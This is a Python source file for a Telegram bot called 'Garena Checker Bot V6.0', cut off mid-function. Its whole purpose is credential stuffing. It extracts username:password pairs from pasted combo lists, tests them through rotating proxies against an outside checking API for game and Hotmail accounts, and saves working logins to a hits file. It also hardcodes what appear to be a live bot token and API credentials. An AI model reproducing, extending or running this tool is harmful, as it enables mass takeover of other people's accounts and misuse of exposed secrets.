import subprocess
import sys
import importlib
import threading
import time
import json
import os
import re
import telebot
import requests
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import random

def install_package(package_name):
    """Cài đặt package nếu chưa có"""
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "pyTelegramBotAPI"]:
    install_package(pkg)

# ========== FIX CHO RENDER WEB SERVICE ==========
import os as os_module
import threading as threading_module
from http.server import HTTPServer, BaseHTTPRequestHandler

class RenderHandler(BaseHTTPRequestHandler):
    """Xử lý HTTP request để Render giữ bot sống - GIAO DIỆN ĐẸP"""
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = self.generate_dashboard()
            self.wfile.write(html.encode('utf-8'))
        elif self.path == '/ping':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"pong")
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            stats_json = json.dumps({
                "status": "alive",
                "checking": checking,
                "stats": stats,
                "proxy_count": len(proxy_list),
                "services": list(SERVICE_ROUTES.keys()),
                "admin": ADMIN_USERNAME,
                "version": "6.0"
            })
            self.wfile.write(stats_json.encode('utf-8'))
        elif self.path == '/api/services':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            services_json = json.dumps(SERVICE_ROUTES)
            self.wfile.write(services_json.encode('utf-8'))
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
    
    def generate_dashboard(self):
        """Tạo dashboard HTML đẹp"""
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uptime = time.time() - start_time if 'start_time' in globals() else 0
        uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
        
        with proxy_lock:
            proxy_count = len(proxy_list)
        
        # Đọc số lượng hits từ file
        hits_count = 0
        dead_count = 0
        try:
            if os.path.exists(OUTPUT_HITS):
                with open(OUTPUT_HITS, 'r', encoding='utf-8') as f:
                    hits_count = len(f.readlines())
            if os.path.exists(OUTPUT_DEAD):
                with open(OUTPUT_DEAD, 'r', encoding='utf-8') as f:
                    dead_count = len(f.readlines())
        except:
            pass
        
        # Trạng thái bot
        bot_status = "Đang check" if checking else "Sẵn sàng"
        bot_color = "#ff9800" if checking else "#4caf50"
        
        # Tạo cards cho services
        services_html = ""
        for key, value in SERVICE_ROUTES.items():
            services_html += f"""
            <div class="service-card">
                <div class="service-icon">{value['icon']}</div>
                <div class="service-info">
                    <div class="service-name">{key}</div>
                    <div class="service-desc">{value['desc']}</div>
                </div>
            </div>"""
        
        html = f"""<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Garena Checker Bot V6.0 - Dashboard</title>
<style>
* {{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}}

body {{
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%);
    min-height: 100vh;
    color: #e0e0e0;
    padding: 20px;
}}

.container {{
    max-width: 1200px;
    margin: 0 auto;
}}

.header {{
    text-align: center;
    padding: 40px 20px;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    border-radius: 20px;
    margin-bottom: 30px;
    border: 1px solid #333;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
}}

.header h1 {{
    font-size: 2.5em;
    color: #00ff00;
    margin-bottom: 10px;
    text-shadow: 0 0 20px rgba(0,255,0,0.5);
}}

.header .subtitle {{
    font-size: 1.2em;
    color: #aaa;
    margin-bottom: 5px;
}}

.header .admin-link {{
    color: #00ff00;
    text-decoration: none;
    font-weight: bold;
}}

.header .admin-link:hover {{
    text-decoration: underline;
}}

.status-badge {{
    display: inline-block;
    padding: 10px 20px;
    border-radius: 50px;
    font-weight: bold;
    font-size: 1.1em;
    margin-top: 15px;
    background: {bot_color};
    color: white;
    box-shadow: 0 0 20px rgba(0,255,0,0.3);
    animation: pulse 2s infinite;
}}

@keyframes pulse {{
    0% {{ box-shadow: 0 0 20px rgba(0,255,0,0.3); }}
    50% {{ box-shadow: 0 0 40px rgba(0,255,0,0.6); }}
    100% {{ box-shadow: 0 0 20px rgba(0,255,0,0.3); }}
}}

.stats-grid {{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
}}

.stat-card {{
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    border-radius: 15px;
    padding: 25px;
    text-align: center;
    border: 1px solid #333;
    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    transition: transform 0.3s ease;
}}

.stat-card:hover {{
    transform: translateY(-5px);
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
}}

.stat-value {{
    font-size: 2.5em;
    font-weight: bold;
    margin-bottom: 10px;
}}

.stat-label {{
    font-size: 0.9em;
    color: #aaa;
    text-transform: uppercase;
    letter-spacing: 1px;
}}

.stat-hits .stat-value {{ color: #00ff00; }}
.stat-dead .stat-value {{ color: #ff4444; }}
.stat-proxy .stat-value {{ color: #ff9800; }}
.stat-checked .stat-value {{ color: #2196f3; }}
.stat-time .stat-value {{ color: #9c27b0; font-size: 1.5em; }}

.section-title {{
    font-size: 1.5em;
    color: #00ff00;
    margin-bottom: 20px;
    text-align: center;
    text-shadow: 0 0 10px rgba(0,255,0,0.3);
}}

.services-grid {{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 15px;
    margin-bottom: 30px;
}}

.service-card {{
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    border-radius: 12px;
    padding: 20px;
    display: flex;
    align-items: center;
    gap: 15px;
    border: 1px solid #333;
    transition: all 0.3s ease;
}}

.service-card:hover {{
    border-color: #00ff00;
    box-shadow: 0 0 20px rgba(0,255,0,0.2);
}}

.service-icon {{
    font-size: 2em;
}}

.service-info {{
    flex: 1;
}}

.service-name {{
    font-size: 1.1em;
    font-weight: bold;
    color: #fff;
    margin-bottom: 5px;
}}

.service-desc {{
    font-size: 0.85em;
    color: #aaa;
}}

.footer {{
    text-align: center;
    padding: 20px;
    color: #666;
    font-size: 0.9em;
}}

.footer a {{
    color: #00ff00;
    text-decoration: none;
}}

.uptime {{
    margin-top: 10px;
    color: #aaa;
    font-size: 0.9em;
}}

@media (max-width: 768px) {{
    .header h1 {{
        font-size: 1.8em;
    }}
    
    .stats-grid {{
        grid-template-columns: repeat(2, 1fr);
    }}
    
    .services-grid {{
        grid-template-columns: 1fr;
    }}
}}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🎮 GARENA CHECKER BOT</h1>
        <div class="subtitle">Version 6.0 - BREAKTHROUGH</div>
        <div class="subtitle">Admin: <a href="https://t.me/{ADMIN_USERNAME}" class="admin-link">@{ADMIN_USERNAME}</a></div>
        <div class="status-badge">🔴 {bot_status}</div>
        <div class="uptime">⏱ Uptime: {uptime_str}</div>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card stat-hits">
            <div class="stat-value">{hits_count}</div>
            <div class="stat-label">✅ Hits</div>
        </div>
        <div class="stat-card stat-dead">
            <div class="stat-value">{dead_count}</div>
            <div class="stat-label">❌ Dead</div>
        </div>
        <div class="stat-card stat-proxy">
            <div class="stat-value">{proxy_count}</div>
            <div class="stat-label">🌐 Proxy</div>
        </div>
        <div class="stat-card stat-checked">
            <div class="stat-value">{stats.get('checked', 0)}</div>
            <div class="stat-label">🔄 Checked</div>
        </div>
        <div class="stat-card stat-time">
            <div class="stat-value">{current_time}</div>
            <div class="stat-label">📅 Thời gian</div>
        </div>
    </div>
    
    <div class="section-title">📋 DỊCH VỤ HỖ TRỢ</div>
    <div class="services-grid">
        {services_html}
    </div>
    
    <div class="footer">
        <p>© 2024 <a href="https://t.me/{ADMIN_USERNAME}">@{ADMIN_USERNAME}</a> - All rights reserved</p>
        <p>Garena Checker Bot V6.0 - Render Web Service</p>
    </div>
</div>
</body>
</html>"""
        
        return html
    
    def log_message(self, format, *args):
        pass

def start_render_server():
    """Khởi động HTTP server cho Render"""
    global start_time
    start_time = time.time()
    try:
        port = int(os_module.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Render web server chay tren port {port}")
        print(f"[*] Dashboard: http://0.0.0.0:{port}")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Loi web server: {e}")

threading_module.Thread(target=start_render_server, daemon=True).start()
# ==============================================

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"

# Kênh bắt buộc phải tham gia
REQUIRED_CHANNEL = "@hakiiosvip"
REQUIRED_CHANNEL_ID = "@hakiiosvip"
REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 60
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.3

CHECKMULTI_THREADS = 30
CHECKMULTI_DELAY = 0.5
CHECKMULTI_BATCH_SIZE = 20
CHECKMULTI_BATCH_DELAY = 3.0

OUTPUT_HITS = "hits.txt"
OUTPUT_DEAD = "dead.txt"
OUTPUT_UNKNOWN = "unknown.txt"
OUTPUT_ERROR = "error.txt"
OUTPUT_RESULT = "result_full.txt"
OUTPUT_LOC = "loc_accounts.txt"
OUTPUT_PROXY = "proxy.txt"

MAX_MESSAGE_LENGTH = 4000

# ========== DANH SÁCH SERVICE ==========
SERVICE_ROUTES = {
    "lienquan": {
        "route": "/api/lienquan",
        "desc": "Lien Quan + FC Online",
        "icon": "🎮",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    },
    "miniworld": {
        "route": "/api/miniworld",
        "desc": "Mini World",
        "icon": "🌍",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "blockmango": {
        "route": "/api/blockmango",
        "desc": "Blockman Go",
        "icon": "🧱",
        "params": ["tk", "mk"],
        "extra_params": {}
    },
    "deltaforce": {
        "route": "/api/deltaforce",
        "desc": "Delta Force",
        "icon": "🔫",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    },
    "hotmail": {
        "route": "/api/hotmail",
        "desc": "Hotmail",
        "icon": "📧",
        "params": ["tk", "mk"],
        "extra_params": {"keyword": ""}
    },
    "fc": {
        "route": "/api/fc",
        "desc": "FC Online",
        "icon": "⚽",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    },
    "fullpack": {
        "route": "/api/fullpack",
        "desc": "Fullpack (Tat ca)",
        "icon": "📦",
        "params": ["tk", "mk"],
        "extra_params": {"proxy": ""}
    }
}

# ========== BIẾN TOÀN CỤC ==========
checking = False
stop_event = threading.Event()
pending_accounts = {}
proxy_list = []
proxy_lock = threading.Lock()
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
cache_results = {}
cache_lock = threading.Lock()

rate_lock = threading.Lock()
last_request_time = 0
start_time = time.time()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

# ========== RATE LIMITER ==========
def rate_limit(delay=DEFAULT_DELAY):
    """Đảm bảo delay giữa các request"""
    global last_request_time
    with rate_lock:
        current_time = time.time()
        time_since_last = current_time - last_request_time
        if time_since_last < delay:
            sleep_time = delay - time_since_last
            time.sleep(sleep_time)
        last_request_time = time.time()

# ========== FIX ENCODING ==========
def fix_encoding(text):
    """Sửa lỗi encoding tiếng Việt từ API"""
    if not isinstance(text, str):
        return text
    
    replacements = {
        'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
        'Ã¢': 'â', 'Äƒ': 'ă', 'Ãª': 'ê', 'Ã­': 'í', 'Ã¬': 'ì',
        'á»‹': 'ị', 'á»‰': 'ỉ', 'Ä©': 'ĩ', 'Ã³': 'ó', 'Ã²': 'ò',
        'Ãº': 'ú', 'Ã¹': 'ù', 'Ã½': 'ý', 'á»³': 'ỳ',
        'á»·': 'ỷ', 'á»µ': 'ỵ',
        'Nghiá»‡p': 'Nghiệp', 'Hoáº£': 'Hoả', 'YÃªu': 'Yêu', 'Háº­u': 'Hậu',
        'Tháº¿': 'Thế', 'Tá»­': 'Tử', 'Nguyá»‡t': 'Nguyệt', 'Tá»™c': 'Tộc',
        'SiÃªu': 'Siêu', 'viá»‡t': 'việt', 'Ngá»™': 'Ngộ', 'KhÃ´ng': 'Không',
        'Äao': 'Đao', 'phá»§': 'phủ', 'táº­n': 'tận', 'tháº¿': 'thế',
        'Giai': 'Giai', 'Ä‘iá»‡u': 'điệu', 'GiÃ¡ng': 'Giáng', 'Sinh': 'Sinh',
        'Äá»“ng': 'Đồng', 'phá»¥c': 'phục', 'Cáº¥p': 'Cấp', 'Tá»‘i': 'Tối', 'ThÆ°á»£ng': 'Thượng',
        'hÃ nh': 'hành', 'K.CÆ°Æ¡ng': 'K.Cương',
        'Tel\'Annas': "Tel'Annas", 'VÅ©': 'Vũ', 'khÃºc': 'khúc', 'yÃªu': 'yêu',
        'Airi': 'Airi', 'Murad': 'Murad', 'Veera': 'Veera', 'Raz': 'Raz',
        'Lindis': 'Lindis', 'Zephys': 'Zephys', 'Slimz': 'Slimz', 'Alice': 'Alice',
        'Florentino': 'Florentino', 'Qi': 'Qi', 'Annie': 'Annie', 'Ryoma': 'Ryoma',
        'NhÃ³c': 'Nhóc', 'Jujutsu': 'Jujutsu', 'Sorcerer': 'Sorcerer',
        'Maloch': 'Maloch', 'Tulen': 'Tulen', 'Omen': 'Omen', 'Bijan': 'Bijan',
        'Triá»‡u': 'Triệu', 'Krixi': 'Krixi', 'Violet': 'Violet', 'Lá»¯': 'Lữ',
        'SEVEN': 'SEVEN', 'Thá»©': 'Thứ',
        'Chưa có': 'Chưa có', 'ChÆ°a': 'Chưa', 'cÃ³': 'có',
        'áº¥': 'ấ', 'áº§': 'ầ', 'áº©': 'ẩ', 'áº«': 'ẫ', 'áº­': 'ậ',
        'áº¯': 'ắ', 'áº±': 'ằ', 'áº³': 'ẳ', 'áºµ': 'ẵ', 'áº·': 'ặ',
        'á»': 'ộ', 'á»Ž': 'ỏ', 'Ãµ': 'õ', 'á»§': 'ủ', 'Å©': 'ũ', 'á»¥': 'ụ',
    }
    
    for old, new in replacements.items():
        text = text.replace(old, new)
    
    if any(char in text for char in ['Ã', 'Ä', 'Æ', 'á»', 'áº']):
        try:
            fixed = text.encode('latin-1', errors='ignore').decode('utf-8', errors='ignore')
            if fixed != text and len(fixed) > 0:
                text = fixed
        except:
            pass
    
    return text

# ========== KIỂM TRA THÀNH VIÊN KÊNH ==========
def is_user_member(user_id):
    """Kiểm tra user có tham gia kênh bắt buộc không"""
    try:
        chat_member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        status = chat_member.status
        if status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception as e:
        print(f"[!] Loi kiem tra thanh vien: {e}")
        return False

def check_membership(message):
    """Kiểm tra và gửi thông báo yêu cầu tham gia kênh"""
    user_id = message.from_user.id
    if is_user_member(user_id):
        return True
    
    markup = telebot.types.InlineKeyboardMarkup()
    join_button = telebot.types.InlineKeyboardButton(
        text="📢 THAM GIA KÊNH BẮT BUỘC",
        url=REQUIRED_CHANNEL_URL
    )
    check_button = telebot.types.InlineKeyboardButton(
        text="✅ TÔI ĐÃ THAM GIA",
        callback_data="check_join"
    )
    markup.add(join_button)
    markup.add(check_button)
    
    safe_send_message(
        message.chat.id,
        f"""
🔒 <b>BẠN CHƯA THAM GIA KÊNH BẮT BUỘC!</b>

📢 Vui lòng tham gia kênh sau để sử dụng bot:
👉 <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>

Sau khi tham gia, bấm nút bên dưới để xác nhận!
""",
        parse_mode="HTML"
    )
    
    try:
        bot.send_message(message.chat.id, "👇 Xác nhận sau khi tham gia:", reply_markup=markup)
    except:
        pass
    
    return False

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    """Xử lý nút xác nhận đã tham gia kênh"""
    user_id = call.from_user.id
    
    if is_user_member(user_id):
        bot.answer_callback_query(call.id, "✅ Xác nhận thành công!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        safe_send_message(
            call.message.chat.id,
            "✅ <b>XÁC NHẬN THÀNH CÔNG!</b>\n\nChào mừng bạn đến với bot!\nDùng /start để xem hướng dẫn."
        )
    else:
        bot.answer_callback_query(call.id, "❌ Bạn chưa tham gia kênh!", show_alert=True)
        safe_send_message(
            call.message.chat.id,
            f"""
❌ <b>BẠN CHƯA THAM GIA KÊNH!</b>

Vui lòng tham gia: <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>
Sau đó bấm nút xác nhận lại.
"""
        )

# ========== HÀM GỬI TIN NHẮN ==========
def safe_send_message(chat_id, text, parse_mode="HTML"):
    """Gửi tin nhắn an toàn"""
    if not text:
        return
    
    text = fix_encoding(text)
    
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        current_part = ""
        lines = text.split('\n')
        
        for line in lines:
            if len(current_part) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        
        if current_part:
            parts.append(current_part)
        
        for part in parts:
            try:
                bot.send_message(chat_id, part.strip(), parse_mode=parse_mode)
                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Loi gui tin nhan: {e}")
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse_mode)
        except Exception as e:
            print(f"[!] Loi gui tin nhan: {e}")

# ========== QUẢN LÝ PROXY ==========
def load_proxy_from_text(content):
    """Load proxy từ text"""
    global proxy_list
    
    proxies = []
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        parts = line.split(':')
        if len(parts) == 2:
            ip, port = parts
            if is_valid_ip_port(ip, port):
                proxies.append({
                    "ip": ip, "port": port,
                    "user": "", "password": "",
                    "full": f"{ip}:{port}"
                })
        elif len(parts) == 4:
            ip, port, user, password = parts
            if is_valid_ip_port(ip, port):
                proxies.append({
                    "ip": ip, "port": port,
                    "user": user, "password": password,
                    "full": f"{ip}:{port}:{user}:{password}"
                })
    
    with proxy_lock:
        proxy_list = proxies
    
    return len(proxies)

def is_valid_ip_port(ip, port):
    """Kiểm tra ip và port hợp lệ"""
    try:
        port_num = int(port)
        if port_num < 1 or port_num > 65535:
            return False
        ip_parts = ip.split('.')
        if len(ip_parts) == 4:
            for part in ip_parts:
                num = int(part)
                if num < 0 or num > 255:
                    return False
            return True
        if re.match(r'^[a-zA-Z0-9.-]+$', ip):
            return True
        return False
    except:
        return False

def get_random_proxy():
    """Lấy proxy ngẫu nhiên"""
    with proxy_lock:
        if not proxy_list:
            return None
        return random.choice(proxy_list)

def build_proxy_string(proxy):
    """Tạo chuỗi proxy cho API"""
    if not proxy:
        return ""
    if proxy["user"] and proxy["password"]:
        return f"{proxy['user']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
    else:
        return f"{proxy['ip']}:{proxy['port']}"

def save_proxy_file():
    """Lưu danh sách proxy vào file"""
    with file_lock:
        with open(OUTPUT_PROXY, 'w', encoding='utf-8') as f:
            with proxy_lock:
                for proxy in proxy_list:
                    f.write(f"{proxy['full']}\n")

# ========== LỌC TK MK - LOẠI BỎ HOÀN TOÀN TIME ==========
def loc_tk_mk_only(content):
    """Lọc tài khoản, CHỈ lấy tk:mk hoặc tk|mk, LOẠI BỎ time và các dòng không phải acc"""
    accounts = []
    seen = set()
    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
    
    if not content:
        return accounts, stats_loc
    
    # Pattern cho dấu : (user:pass) - hỗ trợ email và ký tự đặc biệt
    pattern_colon = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    
    # Pattern cho dấu | (user|pass)
    pattern_pipe = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})\|([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    
    lines = content.split('\n')
    stats_loc["total"] = len(lines)
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        # BỎ QUA DÒNG CHỈ CHỨA TIME (HH:MM hoặc HH:MM:SS)
        if re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line):
            continue
        
        # BỎ QUA DÒNG CHỈ CHỨA SỐ
        if re.match(r'^\d+$', line):
            continue
        
        # Thử pattern dấu : trước - CHỈ LẤY USER:PASS HỢP LỆ
        matches = re.findall(pattern_colon, line)
        if matches:
            for user, pwd in matches:
                # BỎ QUA NẾU USER HOẶC PWD LÀ TIME
                if is_time_value(user) or is_time_value(pwd):
                    continue
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
            continue
        
        # Thử pattern dấu |
        matches = re.findall(pattern_pipe, line)
        if matches:
            for user, pwd in matches:
                if is_time_value(user) or is_time_value(pwd):
                    continue
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    
    # Nếu không tìm thấy, thử tìm trong toàn bộ nội dung
    if not accounts:
        all_matches = re.findall(pattern_colon, content)
        for user, pwd in all_matches:
            if is_time_value(user) or is_time_value(pwd):
                continue
            if is_valid_account(user, pwd):
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
                    stats_loc["valid"] += 1
                else:
                    stats_loc["duplicate"] += 1
            else:
                stats_loc["invalid"] += 1
        
        if not accounts:
            all_matches = re.findall(pattern_pipe, content)
            for user, pwd in all_matches:
                if is_time_value(user) or is_time_value(pwd):
                    continue
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    
    return accounts, stats_loc

def is_time_value(value):
    """Kiểm tra chuỗi có phải là giá trị thời gian không - CHÍNH XÁC"""
    if not value:
        return False
    
    value = str(value).strip()
    
    # Pattern nhận diện time CHÍNH XÁC
    time_patterns = [
        r'^\d{1,2}:\d{2}(:\d{2})?$',                    # 12:30, 12:30:45
        r'^\d{1,2}:\d{2}(:\d{2})?\s*(AM|PM|am|pm)$',    # 12:30 AM
        r'^\d{1,2}\.\d{2}(\.\d{2})?$',                   # 12.30
        r'^\d{1,2}-\d{2}(-\d{2})?$',                     # 12-30
        r'^\d{1,2}/\d{2}(/\d{2,4})?$',                   # 12/30
        r'^\d{4}-\d{2}-\d{2}$',                          # 2024-12-30
        r'^\d{4}/\d{2}/\d{2}$',                          # 2024/12/30
        r'^\d{2}-\d{2}-\d{4}$',                          # 30-12-2024
        r'^\d{2}/\d{2}/\d{4}$',                          # 30/12/2024
        r'^\d{1,2}h\d{2}(p\d{2})?$',                     # 12h30
        r'^\d{1,2}giờ\d{2}$',                            # 12giờ30
        r'^\d{1,2}:\d{2}:\d{2}\.\d+$',                   # 12:30:45.123
        r'^\d+:\d+$',                                    # Bất kỳ số:số
        r'^\d+\.\d+$',                                   # 12.30
        r'^\d+-\d+$',                                    # 12-30
        r'^\d{10,13}$',                                  # Unix timestamp
        r'^\d{1,2}\s*(AM|PM|am|pm)$',                    # 12 AM
    ]
    
    for pattern in time_patterns:
        if re.match(pattern, value, re.IGNORECASE):
            return True
    
    return False

def is_valid_account(user, pwd):
    """Kiểm tra tài khoản hợp lệ - loại bỏ time"""
    if len(user) < 2 or len(pwd) < 1:
        return False
    
    if len(user) > 80 or len(pwd) > 100:
        return False
    
    # Bỏ qua nếu user hoặc pwd là thời gian
    if is_time_value(user) or is_time_value(pwd):
        return False
    
    # Bỏ qua nếu user hoặc pwd chỉ toàn số
    if re.match(r'^\d+$', user) or re.match(r'^\d+$', pwd):
        return False
    
    user_lower = user.lower()
    
    # Bỏ qua từ khóa
    skip_keywords = ['time', 'date', 'ngay', 'thoi_gian', 'thoigian', 'gio', 'giờ', 
                     'phut', 'phút', 'giay', 'giây', 'timestamp', 'datetime',
                     'created', 'login', 'session', 'expires', 'expire', 'valid',
                     'http', 'https', 'www', 'com', 'net', 'org', 'shop', 'share', 
                     'final', 'name', 'level', 'rank', 'status', 'email', 'phone', 
                     'sdt', 'cccd', 'fb', 'ban', 'ss', 'sss', 'anime', 'other', 
                     'am', 'pm', 'utc', 'gmt']
    
    for keyword in skip_keywords:
        if keyword in user_lower:
            return False
    
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@+-]*$', user):
        return False
    
    if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-+]+$', pwd):
        return False
    
    return True

# ========== LƯU FILE ==========
def save_loc_file(accounts):
    """Lưu danh sách đã lọc vào file - CHỈ TK:MK"""
    with file_lock:
        with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")

def save_result(username, password, status, service=""):
    """Lưu kết quả vào các file"""
    with file_lock:
        if status == "hit":
            with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        elif status == "dead":
            with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        elif status == "unknown":
            with open(OUTPUT_UNKNOWN, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        else:
            with open(OUTPUT_ERROR, 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
        
        with open(OUTPUT_RESULT, 'a', encoding='utf-8') as f:
            f.write(f"{username}:{password}|{status}|{service}\n")

# ========== CHUYỂN ĐỔI GIÁ TRỊ ==========
def format_value(value):
    """Chuyển đổi giá trị True/False thành YES/NO"""
    if isinstance(value, bool):
        return "YES" if value else "NO"
    elif isinstance(value, str) and value.lower() in ["true", "false"]:
        return "YES" if value.lower() == "true" else "NO"
    return value

# ========== CHECK API ==========
def check_account_api(username, password, service, use_delay=True):
    """Gọi API kiểm tra tài khoản"""
    if use_delay:
        rate_limit(DEFAULT_DELAY)
    
    cache_key = f"{username}:{password}:{service}"
    with cache_lock:
        if cache_key in cache_results:
            return cache_results[cache_key]
    
    service_info = SERVICE_ROUTES.get(service, {})
    route = service_info.get("route", "/api/lienquan")
    param_names = service_info.get("params", ["tk", "mk"])
    extra_params = service_info.get("extra_params", {})
    
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD
    }
    
    if len(param_names) >= 2:
        params[param_names[0]] = username
        params[param_names[1]] = password
    else:
        params["tk"] = username
        params["mk"] = password
    
    proxy = get_random_proxy()
    if proxy:
        proxy_str = build_proxy_string(proxy)
        if "proxy" in extra_params or service in ["lienquan", "deltaforce", "fc", "fullpack"]:
            params["proxy"] = proxy_str
    else:
        for key, value in extra_params.items():
            params[key] = value
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Connection": "keep-alive"
    }
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    result_data = resp.json()
                    
                    if isinstance(result_data, dict):
                        for key, value in result_data.items():
                            if isinstance(value, str):
                                result_data[key] = fix_encoding(value)
                            elif isinstance(value, list):
                                result_data[key] = [fix_encoding(item) if isinstance(item, str) else item for item in value]
                            elif isinstance(value, dict):
                                for sub_key, sub_value in value.items():
                                    if isinstance(sub_value, str):
                                        value[sub_key] = fix_encoding(sub_value)
                    
                    if isinstance(result_data, dict):
                        is_hit = False
                        
                        status_val = result_data.get("status")
                        if status_val is not None:
                            if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS", "HIT", "hit"]:
                                is_hit = True
                            elif status_val in [False, "false", 0, "0", "False", "FALSE", "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
                                is_hit = False
                        
                        success_val = result_data.get("success")
                        if not is_hit and success_val is not None:
                            if success_val in [True, "true", 1, "1", "True", "TRUE"]:
                                is_hit = True
                            elif success_val in [False, "false", 0, "0", "False", "FALSE"]:
                                is_hit = False
                        
                        result_val = result_data.get("result")
                        if result_val is not None:
                            result_str = str(result_val).lower()
                            if result_str in ["hit", "true", "success", "valid", "1", "live", "ok"]:
                                is_hit = True
